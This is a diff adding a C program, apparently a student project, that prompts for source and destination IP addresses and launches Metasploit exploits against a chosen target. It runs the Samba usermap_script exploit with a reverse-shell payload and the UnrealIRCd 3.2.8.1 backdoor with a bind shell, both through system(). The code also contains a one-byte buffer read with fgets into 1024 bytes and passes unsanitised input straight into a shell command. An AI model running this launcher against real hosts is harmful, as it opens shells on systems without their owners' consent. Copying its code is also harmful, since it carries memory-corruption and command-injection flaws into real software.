@@ -1,0 +1,93 @@
+//Maghen Smith
+//Project 2 -- My program asks the user for source and destination IP addresses. I use the exploits msfcli exploit/multi/samba/usermap_script RHOST=DESTINATION_IP PAYLOAD=cmd/unix/reverse LHOST=SOURCE_IP E and msfcli exploit/unix/irc/unreal_ircd_3281_backdoor RHOST=DESTINATION_IP LHOST=SOURCE_IP payload=cmd/unix/bind_ruby E by creating a string of the command and then executing the command using system(command);
+//Sources: http://stackoverflow.com/questions/6088913/using-popen-to-open-a-program-in-command-line, http://www.daniweb.com/software-development/c/tutorials/45806/user-input-strings-and-numbers-c
+
+#include <stdio.h>
+#include <string.h>
+#include <time.h>
+int main(int argc, char *argv[]){
+
+
+printf("Enter 1 , 2, or 3:\t");
+char *option=(char*)malloc(1);
+if ( fgets(option, 1024, stdin) != NULL ){
+	char *newline2 = strchr(option, '\n');
+	if ( newline2 != NULL ){
+		*newline2 = '\0';
+	}
+}
+
+char *source = (char*)malloc(1024), *destination=(char*)malloc(1024);
+char *command = (char*)malloc(1024);
+
+if(strcmp(option, "1")==0){
+printf("You chose exploit/multi/samba/usermap_script\n");
+
+	printf("Enter source IP address: ");
+	if ( fgets(source, 1024, stdin) != NULL ){
+      		char *newline = strchr(source, '\n');
+      		if ( newline != NULL ){
+         		*newline = '\0'; 
+      		}
+	}
+	printf("Enter destination IP address: ");
+	if ( fgets(destination, 1024, stdin) != NULL ){
+      		char *newline1 = strchr(destination, '\n'); 
+      		if ( newline1 != NULL ){
+         		*newline1 = '\0'; 
+ 	}}
+	printf("%s->%s", source, destination);
+
+
+strcpy(command, "");
+strcat(command, "msfcli exploit/multi/samba/usermap_script RHOST=");
+strcat(command, destination);
+strcat(command, " PAYLOAD=cmd/unix/reverse LHOST=");
+strcat(command, source);
+strcat(command, " E 2>&1");
+
+//printf("\ncommand %s", command);
+char buffer[100];
+//FILE *p = popen(command, "w");
+system(command);
+
+//pclose(p);
+}
+else if(strcmp(option, "2")==0){
+printf("You chose exploit/unix/unreal_ircd_3281_backdoor\n");
+
+	printf("Enter source IP address: ");
+	if ( fgets(source, 1024, stdin) != NULL ){
+      		char *newline = strchr(source, '\n');
+      		if ( newline != NULL ){
+         		*newline = '\0'; 
+      		}
+	}
+	printf("Enter destination IP address: ");
+	if ( fgets(destination, 1024, stdin) != NULL ){
+      		char *newline1 = strchr(destination, '\n'); 
+      		if ( newline1 != NULL ){
+         		*newline1 = '\0'; 
+ 	}}
+
+
+strcpy(command, "");
+strcat(command, "msfcli exploit/unix/irc/unreal_ircd_3281_backdoor RHOST=");
+strcat(command, destination);
+strcat(command, " LHOST=");
+strcat(command, source);
+strcat(command, " payload=cmd/unix/bind_ruby E");
+
+system(command);
+ 
+}
+else{
+printf("Goodbye!");
+exit(0);
+}
+
+
+
+
+return 0;	
+}
